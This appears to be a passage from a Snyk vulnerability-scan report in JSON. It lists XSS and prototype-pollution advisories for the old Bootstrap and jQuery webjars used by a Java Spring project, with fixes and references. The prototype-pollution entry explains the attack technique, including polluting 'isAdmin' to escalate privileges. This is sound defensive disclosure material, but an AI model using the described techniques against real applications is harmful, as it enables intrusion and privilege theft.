\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.webjars:bootstrap` to version 3.4.0 or higher.\n## References\n- [GetBootsrap Blog](https://blog.getbootstrap.com/2018/12/13/bootstrap-3-4-0/)\n- [GitHub Issue](https://github.com/twbs/bootstrap/issues/27044)\n- [GitHub PR](https://github.com/twbs/bootstrap/pull/27047)\n",
      "disclosureTime": "2018-08-13T05:41:27Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "3.4.0"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGWEBJARS-451164",
      "identifiers": {
        "CVE": [
          "CVE-2018-20676"
        ],
        "CWE": [
          "CWE-79"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "bootstrap",
        "groupId": "org.webjars"
      },
      "modificationTime": "2020-12-14T14:41:11.152542Z",
      "moduleName": "org.webjars:bootstrap",
      "packageManager": "maven",
      "packageName": "org.webjars:bootstrap",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-01-10T09:27:20Z",
      "references": [
        {
          "title": "GetBootsrap Blog",
          "url": "https://blog.getbootstrap.com/2018/12/13/bootstrap-3-4-0/"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/twbs/bootstrap/issues/27044"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/twbs/bootstrap/pull/27047"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,3.4.0)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Cross-site Scripting (XSS)",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.webjars:bootstrap@3.3.6"
      ],
      "upgradePath": [
        false,
        "org.webjars:bootstrap@3.4.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.webjars:bootstrap",
      "version": "3.3.6"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N/E:P",
      "alternativeIds": [],
      "creationTime": "2019-06-28T12:18:30.678974Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\n[org.webjars:bootstrap](https://mvnrepository.com/artifact/org.webjars/bootstrap) is a WebJar for Bootstrap.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via the `affix` configuration target property.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.webjars:bootstrap` to version 3.4.0 or higher.\n## References\n- [GetBootstrap Blog](https://blog.getbootstrap.com/2018/12/13/bootstrap-3-4-0/)\n- [GitHub Commit](https://github.com/twbs/bootstrap/commit/2a5ba23ce8f041f3548317acc992ed8a736b609d)\n- [GitHub PR](https://github.com/twbs/bootstrap/pull/27047)\n- [POC: GitHub Issue](https://github.com/twbs/bootstrap/issues/27045)\n",
      "disclosureTime": "2019-01-09T05:29:00Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "3.4.0"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGWEBJARS-451168",
      "identifiers": {
        "CVE": [
          "CVE-2018-20677"
        ],
        "CWE": [
          "CWE-79"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "bootstrap",
        "groupId": "org.webjars"
      },
      "modificationTime": "2021-09-24T13:25:49.540636Z",
      "moduleName": "org.webjars:bootstrap",
      "packageManager": "maven",
      "packageName": "org.webjars:bootstrap",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-01-10T09:27:20Z",
      "references": [
        {
          "title": "GetBootstrap Blog",
          "url": "https://blog.getbootstrap.com/2018/12/13/bootstrap-3-4-0/"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/twbs/bootstrap/commit/2a5ba23ce8f041f3548317acc992ed8a736b609d"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/twbs/bootstrap/pull/27047"
        },
        {
          "title": "POC: GitHub Issue",
          "url": "https://github.com/twbs/bootstrap/issues/27045"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,3.4.0)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Cross-site Scripting (XSS)",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.webjars:bootstrap@3.3.6"
      ],
      "upgradePath": [
        false,
        "org.webjars:bootstrap@3.4.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.webjars:bootstrap",
      "version": "3.3.6"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2019-11-04T11:21:21.218346Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\n[org.webjars:bootstrap](https://mvnrepository.com/artifact/org.webjars/bootstrap) is a WebJar for Bootstrap.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS) via the `data-target` attribute.\n## Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n### Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n### Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n### How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\nUpgrade `org.webjars:bootstrap` to version 3.4.0, 4.0.0-beta.2 or higher.\n## References\n- [Bootstrap Blog](https://blog.getbootstrap.com/2018/07/12/bootstrap-4-1-2/)\n- [GitHub Commit](https://github.com/twbs/bootstrap/commit/9612830701211d757ff95ceccbb494fd2e7ee17e)\n- [GitHub Commit](https://github.com/twbs/bootstrap/pull/23687/commits/d9be1da55bf0f94a81e8a2c9acf5574fb801306e)\n- [GitHub Issue](https://github.com/twbs/bootstrap/issues/20184)\n- [GitHub PR](https://github.com/twbs/bootstrap/pull/23679)\n- [GitHub PR](https://github.com/twbs/bootstrap/pull/23687)\n",
      "disclosureTime": "2016-06-27T17:23:26Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "3.4.0",
        "4.0.0-beta.2"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGWEBJARS-479505",
      "identifiers": {
        "CVE": [
          "CVE-2016-10735"
        ],
        "CWE": [
          "CWE-79"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "bootstrap",
        "groupId": "org.webjars"
      },
      "modificationTime": "2020-12-14T14:40:54.409334Z",
      "moduleName": "org.webjars:bootstrap",
      "packageManager": "maven",
      "packageName": "org.webjars:bootstrap",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2018-01-19T09:37:48Z",
      "references": [
        {
          "title": "Bootstrap Blog",
          "url": "https://blog.getbootstrap.com/2018/07/12/bootstrap-4-1-2/"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/twbs/bootstrap/commit/9612830701211d757ff95ceccbb494fd2e7ee17e"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/twbs/bootstrap/pull/23687/commits/d9be1da55bf0f94a81e8a2c9acf5574fb801306e"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/twbs/bootstrap/issues/20184"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/twbs/bootstrap/pull/23679"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/twbs/bootstrap/pull/23687"
        }
      ],
      "semver": {
        "vulnerable": [
          "(,3.4.0)",
          "[4.0.0-alpha,4.0.0-beta.2)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Cross-site Scripting (XSS)",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.webjars:bootstrap@3.3.6"
      ],
      "upgradePath": [
        false,
        "org.webjars:bootstrap@3.4.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.webjars:bootstrap",
      "version": "3.3.6"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P",
      "alternativeIds": [],
      "creationTime": "2019-11-04T11:39:13.365408Z",
      "credit": [
        "Semmle Security Research Team"
      ],
      "cvssScore": 5.6,
      "description": "## Overview\n[org.webjars:jquery](https://www.npmjs.com/package/jquery) is a JavaScript library. It makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The `extend` function can be tricked into modifying the prototype of `Object` when the attacker controls part of the structure passed to this function. This can let an attacker add or modify an existing property that will then exist on all objects.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `org.webjars:jquery` to version 3.4.0 or higher.\n## References\n- [GitHub Commit](https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b)\n- [GitHub PR](https://github.com/jquery/jquery/pull/4333)\n- [Hackerone Report](https://hackerone.com/reports/454365)\n- [Snyk Blog](https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/)\n- [Third-Party Backported Patches Repo](https://github.com/DanielRuf/snyk-js-jquery-174006)\n",
      "disclosureTime": "2019-03-26T08:40:15Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "3.4.0"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGWEBJARS-479774",
      "identifiers": {
        "CVE": [
          "CVE-2019-11358",
          "CVE-2019-5428"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-wv67-q8rr-grjp"
        ],
        "NSP": [
          "796"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jquery",
        "groupId": "org.webjars"
      },
      "modificationTime": "2021-11-17T15:25:25.303045Z",
      "moduleName": "org.webjars:jquery",
      "packageManager": "maven",
      "packageName": "org.webjars:jquery",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2019-03-27T08:40:08Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/jquery/jquery/pull/4333"
        },
        {
          "title": "Hackerone Report",
          "url": "https://hackerone.com/reports/454365"
        },
        {
          "title": "Snyk Blog",
          "url": "https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/"
        },
        {
          "title": "Third-Party Backported Patches Repo",
          "url": "https://github.com/DanielRuf/snyk-js-jquery-174006"
        }
      ],
      "semver": {
        "vulnerable": [
          "(,3.4.0)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Prototype Pollution",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.webjars:bootstrap@3.3.6",
        "org.webjars:jquery@1.11.1"
      ],
      "upgradePath": [
        false,
        "org.webjars:bootstrap@4.4.1-1",
        "org.webjars:jquery@3.4.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.webjars:jquery",
      "version": "1.11.1"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2019-11-04T11:39:30.288441Z",
      "credit": [
        "Egor Homakov"
      ],
      "cvssScore": 5.4,
      "description": "## Overview\n\n[org.webjars:jquery](https://www.npmjs.com/package/jquery) is a JavaScript library. It makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\n\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS)\nattacks when a cross-domain ajax request is performed without the `dataType` option causing `text/javascript` responses to be executed.\n\n## Details\n A cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\r\n\r\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\r\n\r\nֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\r\n\r\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\r\n \r\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \r\n\r\n### Types of attacks\r\nThere are a few methods by which XSS can be manipulated:\r\n\r\n|Type|Origin|Description|\r\n|--|--|--|\r\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\r\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \r\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\r\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\r\n\r\n### Affected environments\r\nThe following environments are susceptible to an XSS attack:\r\n\r\n* Web servers\r\n* Application servers\r\n* Web application environments\r\n\r\n### How to prevent\r\nThis section describes the top best practices designed to specifically protect your code: \r\n\r\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \r\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \r\n* Give users the option to disable client-side scripts.\r\n* Redirect invalid requests.\r\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\r\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\r\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n\n## Remediation\n\nUpgrade `org.webjars:jquery` to version 1.12.2, 2.2.0, 3.0.0 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/jquery/jquery/commit/f60729f3903d17917dc351f3ac87794de379b0cc)\n\n- [GitHub Commit](https://github.com/jquery/jquery/pull/2588/commits/c254d308a7d3f1eac4d0b42837804cfffcba4bb2)\n\n- [GitHub Issue](https://github.com/jquery/jquery/issues/2432)\n\n- [GitHub PR](https://github.com/jquery/jquery/pull/2588)\n",
      "disclosureTime": "2015-06-26T21:00:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "1.12.2",
        "2.2.0",
        "3.0.0"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-ORGWEBJARS-479782",
      "identifiers": {
        "CVE": [
          "CVE-2015-9251",
          "CVE-2017-16012"
        ],
        "CWE": [
          "CWE-79"
        ],
        "GHSA": [
          "GHSA-rmxg-73gg-4p98"
        ],
        "NSP": [
          "328"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jquery",
        "groupId": "org.webjars"
      },
      "modificationTime": "2021-12-09T15:54:52.503429Z",
      "moduleName": "org.webjars:jquery",
      "packageManager": "maven",
      "packageName": "org.webjars:jquery",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2016-11-27T00:00:00Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/jquery/jquery/commit/f60729f3903d17917dc351f3ac87794de379b0cc"
        },
        {
          "title": "GitHub Commit",
          "url": "https://github.com/jquery/jquery/pull/2588/commits/c254d308a7d3f1eac4d0b42837804cfffcba4bb2"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/jquery/jquery/issues/2432"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/jquery/jquery/pull/2588"
        }
      ],
      "semver": {
        "vulnerable": [
          "(,1.12.2)",
          "[1.12.3,2.2.0)",
          "[2.2.3,3.0.0)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Cross-site Scripting (XSS)",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.webjars:bootstrap@3.3.6",
        "org.webjars:jquery@1.11.1"
      ],
      "upgradePath": [
        false,
        "org.webjars:bootstrap@4.0.0",
        "org.webjars:jquery@3.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "org.webjars:jquery",
      "version": "1.11.1"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-04-13T07:59:14.886750Z",
      "credit": [
        "Masato Kinugawa"
      ],
      "cvssScore": 6.3,
      "description": "## Overview\n\n[org.webjars:jquery](https://www.npmjs.com/package/jquery) is a JavaScript library. It makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\n\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS)\nPassing HTML containing `<option>` elements from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. `.html()`, `.append()`, and others) may execute untrusted code.\n\n## Details\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\r\n\r\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\r\n\r\nֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\r\n\r\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\r\n \r\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \r\n\r\n### Types of attacks\r\nThere are a few methods by which XSS can be manipulated:\r\n\r\n|Type|Origin|Description|\r\n|--|--|--|\r\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\r\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \r\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\r\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\r\n\r\n### Affected environments\r\nThe following environments are susceptible to an XSS attack:\r\n\r\n* Web servers\r\n* Application servers\r\n* Web application environments\r\n\r\n### How to prevent\r\nThis section describes the top best practices designed to specifically protect your code: \r\n\r\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \r\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \r\n* Give users the option to disable client-side scripts.\r\n* Redirect invalid requests.\r\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\r\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\r\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\n\nUpgrade `org.webjars:jquery` to version 3.5.0 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77)\n\n- [PoC](https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html)\n\n- [Release Notes](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/)\n\n- [Security Blog](https://masatokinugawa.l0.cm/2020/05/jquery3.5.0-xss.html?spref=tw)\n",
      "disclosureTime": "2020-04-10T00:00:00Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "3.5.0"
      ],
      "functions": [],
